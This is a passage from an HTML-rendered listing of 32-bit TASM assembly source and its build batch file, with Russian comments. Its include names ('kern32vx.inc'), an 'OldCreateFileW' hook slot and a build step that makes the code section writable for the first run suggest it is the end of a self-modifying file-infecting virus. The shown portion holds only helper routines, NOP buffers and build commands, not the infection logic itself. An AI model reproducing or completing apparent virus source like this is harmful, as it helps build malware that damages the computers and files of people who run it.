         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
         </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">AllocMem</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc1">;-&gt; eax=MemSize</span><span class="sc0">
     </span><span class="sc1">;&lt;- eax=lpMemBuffer</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">callEx</span><span class="sc0"> </span><span class="sc5">GlobalAlloc</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
     </span><span class="sc5">callEx</span><span class="sc0"> </span><span class="sc5">GlobalLock</span><span class="sc0">
     </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">kern32vx.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">dinav2.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">LZPACK.inc</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Lastcmd</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@qr</span><span class="sc0">
</span><span class="sc5">EndBegin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">OldCreateFileW</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">DataBuff</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1110</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">BeginC</span><span class="sc0">
</span><span class="sc4">:-)</span><span class="sc0">
</span><span class="sc5">@echo</span><span class="sc0"> </span><span class="sc5">off</span><span class="sc0">
</span><span class="sc5">@echo</span><span class="sc0"> Компилим </span><span class="sc5">...</span><span class="sc0">
</span><span class="sc5">@z</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">all.bin</span><span class="sc0">\</span><span class="sc5">tasm32.bin</span><span class="sc0">\</span><span class="sc5">tasm.exe</span><span class="sc0">  </span><span class="sc5">program.cmd</span><span class="sc0">
</span><span class="sc5">@echo</span><span class="sc0"> Линкуем  </span><span class="sc5">...</span><span class="sc0">
</span><span class="sc5">@z</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">all.bin</span><span class="sc0">\</span><span class="sc5">tasm32.bin</span><span class="sc0">\</span><span class="sc5">tlink32.exe</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">Tpe</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">aa</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc10">c</span><span class="sc0">  </span><span class="sc5">program</span><span class="sc4">,,,</span><span class="sc0"> </span><span class="sc5">z</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">all.bin</span><span class="sc0">\</span><span class="sc5">tasm32.bin</span><span class="sc0">\</span><span class="sc5">import32.lib</span><span class="sc0">
</span><span class="sc5">@echo</span><span class="sc0"> Установим атрибут </span><span class="sc5">RW</span><span class="sc0"> на секцию кода для первого запуска</span><span class="sc5">.</span><span class="sc0">
</span><span class="sc5">setwrite.exe</span><span class="sc0"> </span><span class="sc5">program.exe</span></div></body>
</html>
